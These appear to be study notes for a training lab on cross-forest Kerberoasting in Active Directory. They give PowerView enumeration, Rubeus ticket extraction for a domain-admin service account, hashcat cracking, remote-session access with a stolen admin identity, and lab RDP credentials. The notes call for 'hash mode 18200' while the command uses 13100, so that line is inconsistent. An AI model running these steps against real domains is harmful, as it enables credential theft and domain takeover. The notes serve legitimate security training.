
>[!info]
>   Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts. You can Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.
>   This can be done with PowerView as shown below

>[!Warning]
> Remember to import PowerView!

##### Enumerating Accounts for Associated SPNs Using Get-DomainUser
```go
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

>[!hint]
>mssqlsvc is one of the accounts present that is a DA member in the target domain

##### Enumerating the mssqlsvc Account
```go
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

##### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

>[!hint]
> The following includes the `/domain:` flag, specifying the target domain.

```go
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```


>[!info] Foreign Group Member
> Use the PowerView function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember/) to enumerate groups with users that do not belong to the domain, also known as `foreign group membership`

##### Using Get-DomainForeignGroupMember
```go
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```


The foreign group member has the SID of `S-1-5-21-3842939050-3880317879-2865463114-500`. And when converted, shows the name to be `INLANEFREIGHT\administrator`
![[Pasted image 20260510070557.png]]

Confirm access by executing the following

##### Accessing DC03 Using Enter-PSSession
```go
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

-----------------------

# Questions

RDP
```go
xfreerdp /v:10.129.82.165 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/domain_trusts /smart-sizing:2400x1200 /cert:ignore
```

### Question 1: Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.

Answer:
```go

```


Enumerate accounts that have SPNs
```go
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

![[Pasted image 20260511060859.png]]

Enumerate the mssqlsvc account, we see that they are an admin on FREIGHTLOGISTICS
```go
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

![[Pasted image 20260511061631.png]]

Execute a Kerberoasting attack across the trust forest with Rubeus
```go
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

Crack the hash using the hash mode 18200
```go
hashcat -m 13100 freightlogistics_hash /usr/share/wordlists/rockyou.txt
```